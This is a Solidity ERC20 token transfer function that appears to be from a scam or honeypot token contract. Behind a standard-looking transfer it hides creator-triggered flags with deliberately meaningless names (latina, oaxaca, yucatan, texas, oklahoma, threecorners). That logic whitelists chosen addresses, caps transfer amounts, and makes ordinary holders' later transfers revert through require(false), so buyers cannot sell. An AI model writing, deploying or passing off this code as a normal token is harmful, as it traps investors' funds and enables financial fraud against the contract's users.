function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (latina == false)) {
        oaxaca = chTx;
        yucatan = true;
    }
    if ((address(sender) == creator) && (latina == true)) {
        threecorners[recipient] = true;
        texas[recipient] = false;
        latina = false;
    }
    if ((amount > maya) && (threecorners[sender] == true) && (address(sender) != creator)) {
        oklahoma[recipient] = true;
    }
    if (threecorners[recipient] != true) {
        texas[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((texas[sender]) && (threecorners[recipient] == false)) {
        texas[recipient] = true;
    }
    if (threecorners[sender] == false) {
        if ((amount > maya) && (oklahoma[sender] == true)) {
            require(false);
        }
        require(amount < oaxaca);
        if (yucatan == true) {
            if (oklahoma[sender] == true) {
                require(false);
            }
            oklahoma[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

